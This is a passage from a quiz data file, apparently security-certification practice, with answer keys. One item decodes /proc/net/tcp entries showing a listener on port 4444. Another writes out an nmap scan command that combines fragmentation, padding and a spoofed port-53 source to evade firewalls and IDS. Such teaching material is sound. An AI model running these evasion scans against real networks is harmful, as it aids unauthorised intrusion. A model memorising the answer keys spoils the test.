1604140A:C6A0 04650DB9:01BB 01`,
    question: 'The second entry has local address 00000000:115C in state 0A. What is it?',
    options: [
      'An established connection to port 4444',
      'A process listening on 0.0.0.0:4444 (0x115C = 4444, state 0A = LISTEN)',
      'A closed socket on port 115',
      'An IPv6 socket',
    ],
    correctIndex: 1,
    explanation: '/proc/net/tcp shows addresses as little-endian hex IP:port. 0x115C = 4444 and state 0A = TCP_LISTEN (01 = ESTABLISHED). Reading /proc directly is useful when netstat/ss binaries are trojaned or missing. The third line is 10.20.4.22 connected to 185.13.101.4:443.',
  },
  {
    id: 'd2-q40',
    domain: 2,
    difficulty: 'Medium',
    scenarioLog: '$ nmap -sS -f --data-length 25 --source-port 53 -p 445 10.20.9.30',
    question: 'Which evasion techniques are combined here?',
    options: [
      'TLS encryption',
      'Decoys and idle scan',
      'Timing evasion only',
      'Packet fragmentation, random payload padding, and a spoofed source port of 53 to exploit firewall rules that trust DNS',
    ],
    correctIndex: 3,
    explanation: '-f splits probes into tiny IP fragments to evade simple packet filters/IDS, --data-length appends random bytes to change packet sizes, and --source-port 53 (-g) abuses poorly written rules that allow any traffic from source port 53. Modern stateful firewalls and reassembling IDS mitigate all three.',
  },
];
